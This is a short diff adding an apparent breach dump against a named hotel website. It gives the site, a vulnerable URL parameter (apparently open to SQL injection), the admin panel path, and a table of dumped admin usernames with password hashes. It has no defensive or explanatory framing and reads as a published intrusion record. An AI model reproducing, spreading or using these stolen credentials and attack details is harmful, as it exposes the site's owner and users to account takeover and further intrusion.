@@ -1,0 +1,10 @@
+Web-site: http://www.embryohotel.com
+vulnerability: http://www.embryohotel.com/room-detail.php?id=1
+Panel: http://www.embryohotel.com/admin/
+Dumped:
++----+----------+------------------------------------------+------------+
+| id | username | password                                 | permission |
++----+----------+------------------------------------------+------------+
+| 1  | admin    | e742c63f03ab602f2b38433ffc28b5145ba1332d | 1          |
+| 2  | ARMERX   | 8988c8cb582506f93b59b794af7212cb5406dfcf | 0          |
++----+----------+------------------------------------------+------------+
